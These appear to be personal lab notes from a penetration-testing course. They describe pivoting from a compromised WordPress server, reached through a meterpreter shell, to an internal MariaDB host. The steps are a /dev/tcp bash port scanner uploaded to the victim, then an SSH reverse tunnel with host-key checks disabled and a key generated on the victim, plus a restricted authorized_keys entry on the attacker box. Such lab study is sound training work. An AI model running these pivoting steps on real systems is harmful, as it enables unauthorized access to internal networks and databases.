Review Time:
- We have a shell on the WordPress box as the www-data user
- We have network access to the DB via Ajla
- We have discovered DB creds that we know are valid as they are in use by the WP app

WP machine and DB box are on seperate networks, so a tunnel is ideal. However, choices are limited due to the fact that our reverse tunnel is running in the context of an unprivileged account without a valid login shell (www-data).

We will use SSH (as it's on most linux machines) to create a reverse tunnel. Since we don't have root to create a login for the www-data user, we will need to use the SSH client on the WP machine to log in to our Kali server to create the tunnels. In short, we need a reverse tunnel.

A dynamic port forward would not be useful since the tunnel would be going the wrong way. Same with a local port forward. 

A remote port forward would allow us to open up a port in kali that would point to the MariaDB server.. but this requires us to know what ports are actually on on the internal target.

Look for nmap on target:
`namp`
Not found

We can create a quick script to scan the host:
```
#!/bin/bash
host=10.5.5.11
for port in {1..65535}; do
timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
echo "port $port is open"
done
echo "Done"
```

Upload the script:
meterpreter >
`upload /home/kali/portscan.sh /tmp/portscan.sh`
`shell`
`cd /tmp`
`chmod +x portscan.sh`
`./portscan.sh`

Scan takes a while, but we see that port 22 and 3306 are open.

First iteration of SSH tunnel command:
`ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 kali@10.11.0.4`
Opens up port 1122 on Kali to point to port 22 on MariaDB host. Also open up 13306 on Kali to point to 3306 on MariaDB host.

Running this in a meterpreter shell is an issue since we don't have a fully interactive shell, ans SSH will prompt us to accept the host key of Kali machine and enter a PW.. which we clearly don't want to do on a host we just compromised.

We can fix the host key issues by passing two optional flags:
`ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@10.11.0.4`

We can prevent SSH asking for our PW using SSH Keys. We will generate SSH keys on teh WP host, config kali to accept a login from a newly-generate key (and only allow port forwarding) and modify the SSH command one more time to match the changes.

Meterpreter>
`mkdir keys`
`cd keys`
`ssh-keygen`
Enter file in which to save key (/var/www/.ssh/id_rse): `/tmp/keys/id_rsa`
Finish up the config.
`cat id_rsa.pub`

New public key needs to be entered into our Kali's hosts **authorized_keys** file for the user. To avoid potential securit issues, we can tighten the SSH config to only permit access from the WP IP (this will be the NAT ip since this is what Kali will see no the actual IP of the WP host).

We also want to ignore any commands the user supplies. *command* ssh option. We also want to prever agent and x11 forwarding with *no-agent-forwarding* and *no-x11-forwarding* options. Finally, we want to prevent user from allocating tty device with *no-tty* option.

Final **~/.ssh/authorized_keys** file on Kali:
```
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa  AAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhU r4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68 Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8
i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/
US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla
```

This entry allows the owner of the private key (the web server) to log in to our kali machine but prevents them from running commands and only allows port forwarding.

We need to modify the SSH command (final iteration):
`ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o
"UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4`
**-N** Don't run any commands
**-f** request ssh backgrounding
**-i** Provided key file

Run the command from meterpreter.

Verify ports are open on our Kali Machine:
Kali>
`sudo netstat -tulpn`
```
...
tcp 0 0 127.0.0.1:13306 0.0.0.0:* LISTEN 91364/sshd: kali
tcp 0 0 127.0.0.1:1122 0.0.0.0:* LISTEN 91364/sshd: kali
...
```
We can see the ports we wanted open to ssh are open and listening.


